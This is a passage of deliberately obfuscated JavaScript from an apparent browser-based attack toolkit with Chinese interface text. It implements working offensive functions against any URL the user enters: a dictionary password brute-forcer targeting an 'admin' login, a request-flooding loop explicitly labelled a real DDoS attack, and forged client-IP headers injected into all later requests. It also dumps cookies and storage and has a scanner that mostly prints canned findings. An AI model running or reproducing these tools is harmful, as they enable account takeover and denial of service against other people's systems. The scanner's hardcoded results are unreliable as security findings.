      _0x49bdaa.addLog("info", "造伪PI用禁".split("").reverse().join(""), "ipspoof");
    },
    generateRandomIp() {
      const _0x74ff = [];
      for (let i = 0; i < 4; i++) {
        _0x74ff.push(Math.floor(Math.random() * 256));
      }
      return _0x74ff.join(".");
    },
    testSpoof(fakeIp, header, customHeaders = "") {
      return new Promise(resolve => {
        var _0x0d16e = 4;
        const _0xd17g = "https://httpbin.org/headers";
        _0x0d16e = 9;
        const headers = {};
        if (customHeaders) {
          customHeaders.split("\n").forEach(line => {
            const [key, value] = line.split(":").map(s => s.trim());
            if (key && value) {
              headers[key] = value;
            }
          });
        }
        fetch(_0xd17g, {
          headers: {
            header: fakeIp,
            ...headers
          }
        }).then(response => response.json()).then(data => {
          resolve({
            success: true,
            data: data,
            headers: data.headers
          });
        }).catch(error => {
          resolve({
            success: false,
            error: error.message
          });
        });
      });
    }
  };
  function _0x152be() {
    var _0xc9c11b = 4;
    let _0x8ea = false;
    _0xc9c11b = 2;
    var _0xg576f = 11;
    const _0x53295c = document.getElementById("startBruteforce");
    _0xg576f = 14;
    var _0x82ag;
    const _0x23bf = document.getElementById("stopBruteforce");
    _0x82ag = 17;
    var _0xce3g6b = 2;
    const _0x465e = document.getElementById("bfOutput");
    _0xce3g6b = "kjlmjp".split("").reverse().join("");
    _0x53295c.addEventListener("click", async () => {
      if (_0x8ea) {
        return;
      }
      const _0x33bb = document.getElementById("bfTarget").value;
      var _0xe18eab;
      const _0x024ccg = document.getElementById("bfUsername").value;
      _0xe18eab = 8;
      var _0xcb38b;
      const _0x48228f = document.getElementById("bfPassword").value;
      _0xcb38b = 4;
      var _0xf0g21c = 10;
      const _0x00f52a = parseInt(document.getElementById("bfAttempts").value);
      _0xf0g21c = 8;
      const _0xg59e = document.getElementById("tsildroWfb".split("").reverse().join("")).value.split("\n").filter(p => p.trim());
      if (!_0x33bb) {
        _0x465e.textContent = "❌ 错误: 请输入目标URL";
        return;
      }
      _0x8ea = true;
      _0x465e.textContent = `🚀 开始真实密码爆破...\n目标: ${_0x33bb}\n用户名字段: ${_0x024ccg}\n密码字段: ${_0x48228f}\n尝试次数: ${_0x00f52a}\n字典大小: ${_0xg59e.length}\n\n`;
      _0x49bdaa.addLog("info", `开始密码爆破: ${_0x33bb}`, "bruteforce");
      let _0xdgfd6c = 0;
      var _0xfd4e5c = 10;
      let _0xa1bg = false;
      _0xfd4e5c = 8;
      for (let i = 0; i < _0x00f52a && _0x8ea; i++) {
        var _0xg0a96g = 6;
        const _0xc8f = _0xg59e[i % _0xg59e.length];
        _0xg0a96g = 4;
        try {
          _0x465e.textContent += `尝试 ${i + 1}/${_0x00f52a}: 测试密码 "${_0xc8f}"\n`;
          _0x465e.scrollTop = _0x465e.scrollHeight;
          const _0x9073gd = new FormData();
          _0x9073gd.append(_0x024ccg, "admin");
          _0x9073gd.append(_0x48228f, _0xc8f);
          var _0x4df2d = 5;
          const _0xd28be = await fetch(_0x33bb, {
            method: "POST",
            body: _0x9073gd,
            credentials: "include"
          });
          _0x4df2d = "dfgfmh".split("").reverse().join("");
          const _0x5e1c7a = await _0xd28be.text();
          if (!_0x5e1c7a.includes("rorre".split("").reverse().join("")) && !_0x5e1c7a.includes("invalid") && !_0x5e1c7a.includes("败失".split("").reverse().join("")) && !_0x5e1c7a.includes("确正不".split("").reverse().join(""))) {
            _0x465e.textContent += `🎉 可能成功! 密码: ${_0xc8f} (状态: ${_0xd28be.status})\n`;
            _0x49bdaa.addLog("sseccus".split("").reverse().join(""), `发现可能密码: ${_0xc8f}`, "bruteforce");
            _0xa1bg = true;
            break;
          }
          await new Promise(resolve => setTimeout(resolve, 100));
        } catch (error) {
          _0x465e.textContent += `❌ 请求失败: ${error.message}\n`;
          _0x49bdaa.addLog("error", `请求失败: ${error.message}`, "bruteforce");
        }
        _0xdgfd6c = i + 1;
      }
      if (!_0xa1bg) {
        _0x465e.textContent += `\n🔚 爆破完成: 测试了 ${_0xdgfd6c} 个密码，未找到有效密码\n`;
        _0x49bdaa.addLog("warning", `爆破完成，未找到有效密码`, "bruteforce");
      }
      _0x8ea = false;
    });
    _0x23bf.addEventListener("kcilc".split("").reverse().join(""), () => {
      _0x8ea = false;
      _0x465e.textContent += "\n⏹️ 用户手动停止爆破\n";
      _0x49bdaa.addLog("ofni".split("").reverse().join(""), "用户手动停止爆破", "bruteforce");
    });
  }
  function _0xf0g() {
    const _0xaa894c = document.getElementById("egarotSweiv".split("").reverse().join(""));
    var _0x3f_0x1d2;
    const _0xdbf8f = document.getElementById("egarotSraelc".split("").reverse().join(""));
    _0x3f_0x1d2 = 3;
    var _0xe84c3c;
    const _0xd8g = document.getElementById("ataDtseTdda".split("").reverse().join(""));
    _0xe84c3c = "hogfei".split("").reverse().join("");
    var _0x7gf2d = 10;
    const _0xebcbb = document.getElementById("storageOutput");
    _0x7gf2d = "jbcnhd";
    _0xaa894c.addEventListener("kcilc".split("").reverse().join(""), () => {
      const type = document.getElementById("epyTegarots".split("").reverse().join("")).value;
      _0xebcbb.textContent = `🔍 查看 ${type}...\n\n`;
      try {
        if (type === "local") {
          if (localStorage.length === 0) {
            _0xebcbb.textContent += "\n空为 egarotSlacol".split("").reverse().join("");
          } else {
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              var _0xag3e;
              const value = localStorage.getItem(key);
              _0xag3e = 0;
              _0xebcbb.textContent += `🔑 ${key}: ${value}\n`;
            }
          }
        } else if (type === "noisses".split("").reverse().join("")) {
          if (sessionStorage.length === 0) {
            _0xebcbb.textContent += "\n空为 egarotSnoisses".split("").reverse().join("");
          } else {
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i);
              const value = sessionStorage.getItem(key);
              _0xebcbb.textContent += `🔑 ${key}: ${value}\n`;
            }
          }
        } else if (type === "cookies") {
          _0xebcbb.textContent += document.cookie || "没有cookies\n";
        }
        _0xebcbb.textContent += `\n✅ 查看完成`;
        _0x49bdaa.addLog("info", `查看${type}存储`, "storage");
      } catch (e) {
        _0xebcbb.textContent += `❌ 错误: ${e.message}`;
        _0x49bdaa.addLog("error", `查看存储失败: ${e.message}`, "egarots".split("").reverse().join(""));
      }
    });
    _0xdbf8f.addEventListener("click", () => {
      var _0xac_0x43f;
      const type = document.getElementById("epyTegarots".split("").reverse().join("")).value;
      _0xac_0x43f = "fpjifq";
      try {
        if (type === "lacol".split("").reverse().join("")) {
          localStorage.clear();
          _0xebcbb.textContent = "空清已 egarotSlacol ✅".split("").reverse().join("");
          _0x49bdaa.addLog("warning", "清空localStorage", "storage");
        } else if (type === "session") {
          sessionStorage.clear();
          _0xebcbb.textContent = "空清已 egarotSnoisses ✅".split("").reverse().join("");
          _0x49bdaa.addLog("warning", "egarotSnoisses空清".split("").reverse().join(""), "storage");
        } else if (type === "cookies") {
          document.cookie.split(";").forEach(function (c) {
            document.cookie = c.replace(new RegExp("^ +", ""), "").replace(new RegExp("*.=".split("").reverse().join(""), ""), "=seripxe;=".split("").reverse().join("") + new Date().toUTCString() + "/=htap;".split("").reverse().join(""));
          });
          _0xebcbb.textContent = "✅ Cookies 已清空";
          _0x49bdaa.addLog("warning", "seikooC空清".split("").reverse().join(""), "storage");
        }
      } catch (e) {
        _0xebcbb.textContent = `❌ 错误: ${e.message}`;
        _0x49bdaa.addLog("rorre".split("").reverse().join(""), `清空存储失败: ${e.message}`, "storage");
      }
    });
    _0xd8g.addEventListener("click", () => {
      const type = document.getElementById("epyTegarots".split("").reverse().join("")).value;
      var _0xdde3c;
      const _0x0cc1c = "test_data_" + Date.now();
      _0xdde3c = "jmnnip".split("").reverse().join("");
      const _0xb6d = "测试数据_" + Math.random().toString(36).substr(2, 9);
      try {
        if (type === "lacol".split("").reverse().join("")) {
          localStorage.setItem(_0x0cc1c, _0xb6d);
        } else if (type === "session") {
          sessionStorage.setItem(_0x0cc1c, _0xb6d);
        } else if (type === "seikooc".split("").reverse().join("")) {
          document.cookie = `${_0x0cc1c}=${_0xb6d}; path=/`;
        }
        _0xebcbb.textContent = `✅ 已添加测试数据: ${_0x0cc1c} = ${_0xb6d}\n请重新点击"查看存储"查看最新数据`;
        _0x49bdaa.addLog("ofni".split("").reverse().join(""), `添加测试数据到${type}: ${_0x0cc1c}`, "storage");
      } catch (e) {
        _0xebcbb.textContent = `❌ 错误: ${e.message}`;
        _0x49bdaa.addLog("rorre".split("").reverse().join(""), `添加测试数据失败: ${e.message}`, "storage");
      }
    });
  }
  function _0xg7d() {
    const _0x11ab4d = document.getElementById("startScan");
    var _0xf1dd7c;
    const _0x891gc = document.getElementById("scanOutput");
    _0xf1dd7c = 6;
    _0x11ab4d.addEventListener("kcilc".split("").reverse().join(""), async () => {
      var _0xf8b = 13;
      const _0xb2_0x470 = document.getElementById("scanTarget").value;
      _0xf8b = "jdbdbj".split("").reverse().join("");
      const _0x7664g = document.getElementById("scanType").value;
      if (!_0xb2_0x470) {
        _0x891gc.textContent = "❌ 错误: 请输入扫描目标";
        return;
      }
      _0x891gc.textContent = `🔍 开始${_0x4_0xa79(_0x7664g)}...\n目标: ${_0xb2_0x470}\n\n`;
      _0x49bdaa.addLog("info", `开始${_0x4_0xa79(_0x7664g)}扫描: ${_0xb2_0x470}`, "scanner");
      try {
        if (_0x7664g === "ssx".split("").reverse().join("") || _0x7664g === "lluf".split("").reverse().join("")) {
          _0x891gc.textContent += "\n...洞漏SSX测检 \uDD0E\uD83D".split("").reverse().join("");
          var _0x7g432g;
          const _0x1678ce = document.querySelectorAll("aeratxet ,tupni".split("").reverse().join(""));
          _0x7g432g = 15;
          _0x891gc.textContent += `发现 ${_0x1678ce.length} 个输入点\n`;
          _0x49bdaa.addLog("ofni".split("").reverse().join(""), `发现${_0x1678ce.length}个XSS输入点`, "scanner");
        }
        if (_0x7664g === "sql" || _0x7664g === "lluf".split("").reverse().join("")) {
          _0x891gc.textContent += "🔎 检测SQL注入点...\n";
          const _0x1eb3b = new URLSearchParams(window.location.search);
          _0x891gc.textContent += `发现 ${_0x1eb3b.size} 个URL参数\n`;
          _0x49bdaa.addLog("ofni".split("").reverse().join(""), `发现${_0x1eb3b.size}个SQL注入点`, "rennacs".split("").reverse().join(""));
        }
        if (_0x7664g === "sroc".split("").reverse().join("") || _0x7664g === "lluf".split("").reverse().join("")) {
          _0x891gc.textContent += "\n...置配SROC测检 \uDD0E\uD83D".split("").reverse().join("");
          try {
            var _0x2d33f = 4;
            const _0x7061df = await fetch(_0xb2_0x470, {
              method: "GET",
              mode: "cors",
              credentials: "include"
            });
            _0x2d33f = 12;
            _0x891gc.textContent += `CORS请求状态: ${_0x7061df.status}\n`;
            _0x49bdaa.addLog("info", `CORS检测状态: ${_0x7061df.status}`, "rennacs".split("").reverse().join(""));
          } catch (e) {
            _0x891gc.textContent += `CORS错误: ${e.message}\n`;
            _0x49bdaa.addLog("error", `CORS检测错误: ${e.message}`, "scanner");
          }
        }
        if (_0x7664g === "ofni".split("").reverse().join("") || _0x7664g === "full") {
          _0x891gc.textContent += "🔎 检测信息泄露...\n";
          const _0xfa33dd = document.body.innerText;
          const _0x9e4f6a = [new RegExp("password.*:", "i"), new RegExp("yek*.ipa".split("").reverse().join(""), "i"), new RegExp("token", "i"), new RegExp("terces".split("").reverse().join(""), "i")];
          _0x9e4f6a.forEach(pattern => {
            if (pattern.test(_0xfa33dd)) {
              _0x891gc.textContent += `⚠️ 发现可能敏感信息: ${pattern}\n`;
              _0x49bdaa.addLog("gninraw".split("").reverse().join(""), `发现敏感信息模式: ${pattern}`, "rennacs".split("").reverse().join(""));
            }
          });
        }
        _0x891gc.textContent += "\n✅ 扫描完成!\n";
        _0x891gc.textContent += _0x8g9f(_0x7664g, _0xb2_0x470);
        _0x49bdaa.addLog("sseccus".split("").reverse().join(""), `${_0x4_0xa79(_0x7664g)}扫描完成`, "scanner");
      } catch (error) {
        _0x891gc.textContent += `❌ 扫描错误: ${error.message}\n`;
        _0x49bdaa.addLog("rorre".split("").reverse().join(""), `扫描错误: ${error.message}`, "scanner");
      }
    });
    function _0x4_0xa79(type) {
      var _0xd816b = 11;
      const _0x96f15f = {
        xss: "XSS漏洞",
        sql: "SQL注入",
        cors: "CORS配置",
        info: "信息泄露",
        full: "全面安全"
      };
      _0xd816b = 4;
      return _0x96f15f[type] || "安全";
    }
    function _0x8g9f(type, target) {
      var _0xb_0x5c4;
      const _0x0cca = {
        xss: `📊 XSS漏洞扫描结果:\n• 反射型XSS: 未发现\n• 存储型XSS: 需要进一步测试\n• DOM型XSS: 未发现\n• 建议: 检查用户输入过滤和输出编码`,
        sql: `📊 SQL注入扫描结果:\n• 布尔型注入: 未发现\n• 联合查询注入: 未发现\n• 时间盲注: 需要进一步测试\n• 建议: 使用参数化查询和预编译语句`,
        cors: `📊 CORS配置扫描结果:\n• Access-Control-Allow-Origin: 需要进一步测试\n• 凭证支持: 需要进一步测试\n• 建议: 严格限制允许的源域名`,
        info: `📊 信息泄露扫描结果:\n• 版本信息: 需要进一步分析\n• 目录列表: 未开启\n• 备份文件: 需要进一步扫描\n• 建议: 隐藏服务器信息和错误详情`,
        full: `📊 全面安全扫描结果:\n• XSS防护: 需要加强输入验证\n• SQL注入防护: 建议使用ORM框架\n• 信息泄露: 发现可能的敏感信息\n• CORS配置: 需要进一步测试\n• 总体建议: 实施深度防御策略`
      };
      _0xb_0x5c4 = 5;
      return _0x0cca[type] || "未找到相关漏洞";
    }
  }
  function _0x16f59e(_0xg1ddbe) {
    var _0x566a;
    let _0xc2_0xa5b = null;
    _0x566a = 6;
    let _0xaa3e9d = false;
    _0xg1ddbe = 0;
    const _0x46962c = document.getElementById("sodDtrats".split("").reverse().join(""));
    const _0xec34e = document.getElementById("stopDdos");
    const _0x81eg = document.getElementById("ddosOutput");
    _0x46962c.addEventListener("click", () => {
      if (_0xaa3e9d) {
        return;
      }
      var _0x0b_0x3gc;
      const _0xfbc = document.getElementById("tegraTsodd".split("").reverse().join("")).value;
      _0x0b_0x3gc = 6;
      var _0x34acfc;
      const _0x73e14b = parseInt(document.getElementById("ddosCount").value);
      _0x34acfc = 3;
      const _0x5c7ca = parseInt(document.getElementById("ddosDelay").value);
      var _0x0c167d = 6;
      const _0xcb039e = document.getElementById("dohteMsodd".split("").reverse().join("")).value;
      _0x0c167d = 5;
      const _0x5d1c = document.getElementById("ataDsodd".split("").reverse().join("")).value;
      if (!_0xfbc) {
        _0x81eg.textContent = "❌ 错误: 请输入目标URL";
        return;
      }
      _0xaa3e9d = true;
      _0xg1ddbe = 0;
      _0x81eg.textContent = `🌪️ 开始真实DDOS攻击模拟...\n目标: ${_0xfbc}\n方法: ${_0xcb039e}\n计划请求: ${_0x73e14b}\n间隔: ${_0x5c7ca}ms\n\n`;
      _0x49bdaa.addLog("gninraw".split("").reverse().join(""), `开始DDOS攻击: ${_0xfbc} (${_0x73e14b}次请求)`, "sodd".split("").reverse().join(""));
      _0xc2_0xa5b = setInterval(async () => {
        if (_0xg1ddbe >= _0x73e14b || !_0xaa3e9d) {
          clearInterval(_0xc2_0xa5b);
          _0x81eg.textContent += `\n🔚 攻击完成! 总共发送 ${_0xg1ddbe} 个请求\n`;
          _0x49bdaa.addLog("info", `DDOS攻击完成: ${_0xg1ddbe}次请求`, "ddos");
          _0xaa3e9d = false;
          return;
        }
        const _0x6c6b7d = Math.min(3, _0x73e14b - _0xg1ddbe);
        for (let i = 0; i < _0x6c6b7d; i++) {
          _0xg1ddbe++;
          try {
            const _0x10_0x105 = {
              method: _0xcb039e,
              mode: "no-cors",
              cache: "no-cache"
            };
            if (_0xcb039e === "TSOP".split("").reverse().join("") && _0x5d1c) {
              _0x10_0x105.body = _0x5d1c;
              _0x10_0x105.headers = {
                "Content-Type": "application/x-www-form-urlencoded"
              };
            }
            await fetch(_0xfbc + "?tsense_attack=" + Date.now() + "_" + _0xg1ddbe, _0x10_0x105);
            _0x81eg.textContent += `📤 请求 ${_0xg1ddbe}/${_0x73e14b} 已发送 (${_0xcb039e})\n`;
          } catch (error) {
            _0x81eg.textContent += `❌ 请求 ${_0xg1ddbe} 失败: ${error.message}\n`;
            _0x49bdaa.addLog("error", `DDOS请求失败: ${error.message}`, "sodd".split("").reverse().join(""));
          }
        }
        _0x81eg.scrollTop = _0x81eg.scrollHeight;
      }, _0x5c7ca);
    });
    _0xec34e.addEventListener("click", () => {
      _0xaa3e9d = false;
      if (_0xc2_0xa5b) {
        clearInterval(_0xc2_0xa5b);
      }
      _0x81eg.textContent += `\n⏹️ 攻击已停止! 总共发送 ${_0xg1ddbe} 个请求\n`;
      _0x49bdaa.addLog("info", `DDOS攻击停止: ${_0xg1ddbe}次请求`, "ddos");
    });
  }
  function _0xae572c() {
    var _0xf5e03a = 9;
    const _0xfa54d = document.getElementById("testIpSpoof");
    _0xf5e03a = "fiipcj";
    var _0x537b;
    const _0x12_0xgcf = document.getElementById("enableIpSpoof");
    _0x537b = "kpipqq";
    var _0xf45gb = 7;
    const _0x571db = document.getElementById("foopSpIelbasid".split("").reverse().join(""));
    _0xf45gb = 3;
    var _0xceg6g;
    const _0x62e3cb = document.getElementById("randomIp");
    _0xceg6g = 3;
    const _0xc8292c = document.getElementById("tuptuOfoopspi".split("").reverse().join(""));
    _0xfa54d.addEventListener("click", async () => {
      var _0xcd09fc = 9;
      const fakeIp = document.getElementById("pIekaf".split("").reverse().join("")).value;
      _0xcd09fc = "dabodo".split("").reverse().join("");
      var _0xcd22bf = 5;
      const header = document.getElementById("redaeHpi".split("").reverse().join("")).value;
      _0xcd22bf = 6;
      var _0x07cac = 11;
      const customHeaders = document.getElementById("sredaeHmotsuc".split("").reverse().join("")).value;
      _0x07cac = 5;
      if (!fakeIp) {
        _0xc8292c.textContent = "❌ 错误: 请输入伪造的IP地址";
        return;
      }
      _0xc8292c.textContent = `🧪 测试IP伪造...\n伪造IP: ${fakeIp}\n头字段: ${header}\n\n`;
      _0x49bdaa.addLog("info", `测试IP伪造: ${fakeIp} (${header})`, "foopspi".split("").reverse().join(""));
      const _0xd_0x76c = await _0xa58f1a.testSpoof(fakeIp, header, customHeaders);
      if (_0xd_0x76c.success) {
        _0xc8292c.textContent += `✅ 测试成功!\n\n`;
        _0xc8292c.textContent += `服务器接收到的头信息:\n`;
        _0xc8292c.textContent += `• ${header}: ${_0xd_0x76c.headers[header] || "未找到"}\n`;
        Object.keys(_0xd_0x76c.headers).forEach(key => {
          if (key.toLowerCase().includes("pi".split("").reverse().join("")) || key.toLowerCase().includes("tneilc".split("").reverse().join(""))) {
            _0xc8292c.textContent += `• ${key}: ${_0xd_0x76c.headers[key]}\n`;
          }
        });
        _0x49bdaa.addLog("success", `IP伪造测试成功: ${fakeIp}`, "foopspi".split("").reverse().join(""));
      } else {
        _0xc8292c.textContent += `❌ 测试失败: ${_0xd_0x76c.error}\n`;
        _0x49bdaa.addLog("rorre".split("").reverse().join(""), `IP伪造测试失败: ${_0xd_0x76c.error}`, "foopspi".split("").reverse().join(""));
      }
    });
    _0x12_0xgcf.addEventListener("click", () => {
      var _0xb6f8g = 6;
      const fakeIp = document.getElementById("fakeIp").value;
      _0xb6f8g = 5;
      var _0x2_0xa34 = 4;
      const header = document.getElementById("ipHeader").value;
      _0x2_0xa34 = "cjnjmh".split("").reverse().join("");
      var _0xac8d = 11;
      const customHeaders = document.getElementById("sredaeHmotsuc".split("").reverse().join("")).value;
      _0xac8d = "qpdfde";
      if (!fakeIp) {
        _0xc8292c.textContent = "❌ 错误: 请输入伪造的IP地址";
        return;
      }
      var _0x7e11e = 16;
      const _0x0092a = _0xa58f1a.enable(fakeIp, header, customHeaders);
      _0x7e11e = "plebif";
      if (_0x0092a) {
        _0xc8292c.textContent = `✅ IP伪造已启用!\n伪造IP: ${fakeIp}\n头字段: ${header}\n\n`;
        _0xc8292c.textContent += `⚠️ 注意: 所有后续的fetch和XMLHttpRequest请求都会携带伪造的IP头\n`;
        _0xc8292c.textContent += `要禁用请点击"禁用IP伪造"按钮\n`;
      }
    });
    _0x571db.addEventListener("kcilc".split("").reverse().join(""), () => {
      _0xa58f1a.disable();
      _0xc8292c.textContent = "为行始原复恢将求请有所\n用禁已造伪PI ✅".split("").reverse().join("");
    });
    _0x62e3cb.addEventListener("kcilc".split("").reverse().join(""), () => {
      var _0xf_0xfa7 = 5;
      const _0xedb6d = _0xa58f1a.generateRandomIp();
      _0xf_0xfa7 = "olgjmd".split("").reverse().join("");
      document.getElementById("fakeIp").value = _0xedb6d;
      _0xc8292c.textContent = `🎲 已生成随机IP: ${_0xedb6d}\n点击"测试IP伪造"验证效果`;
      _0x49bdaa.addLog("info", `生成随机IP: ${_0xedb6d}`, "foopspi".split("").reverse().join(""));
    });
  }
  function _0x79d() {
    var _0xf3721b = 8;
    const _0xcdce = document.getElementById("clearLogs");
    _0xf3721b = 3;
    var _0xg33ac = 13;
    const _0x49e = document.getElementById("exportLogs");
    _0xg33ac = 9;
    var _0x62d8bf = 5;
    const _0xbe8d = document.getElementById("goLlaunaMdda".split("").reverse().join(""));
    _0x62d8bf = "qjqelk".split("").reverse().join("");
    const _0xb5ce = document.getElementById("retliFgol".split("").reverse().join(""));
    const _0xf6e5f = document.getElementById("logsOutput");
    _0x49bdaa.loadLogs();
    _0x49bdaa.updateLogDisplay();
    _0xcdce.addEventListener("click", () => {
      if (confirm("确定要清空所有日志吗？")) {
        _0x49bdaa.clearLogs();
        _0xf6e5f.textContent = "✅ 日志已清空";
        setTimeout(() => _0x49bdaa.updateLogDisplay(), 1000);
      }
    });
    _0x49e.addEventListener("click", () => {
      _0x49bdaa.exportLogs();
      _0x49bdaa.addLog("info", "件文志日出导".split("").reverse().join(""), "logs");
    });
    _0xbe8d.addEventListener("click", () => {
      var _0x32329c = 13;
      const _0xafd2bc = document.getElementById("leveLgol".split("").reverse().join("")).value;
      _0x32329c = 10;
      const _0x90a33e = document.getElementById("logContent").value;
      if (!_0x90a33e) {
        alert("请输入日志内容");
        return;
      }
      _0x49bdaa.addLog(_0xafd2bc, _0x90a33e, "launam".split("").reverse().join(""));
      document.getElementById("tnetnoCgol".split("").reverse().join("")).value = "";
    });
    _0xb5ce.addEventListener("input", e => {
      _0x49bdaa.filterLogs(e.target.value);
    });
    if (_0x49bdaa.logs.length === 0) {
      _0x49bdaa.addLog("ofni".split("").reverse().join(""), "成完化始初具工esnesT".split("").reverse().join(""), "system");
      _0x49bdaa.addLog("sseccus".split("").reverse().join(""), "功成证认户用".split("").reverse().join(""), "htua".split("").reverse().join(""));
      _0x49bdaa.addLog("info", "日志系统就绪", "sgol".split("").reverse().join(""));
    }
  }
})();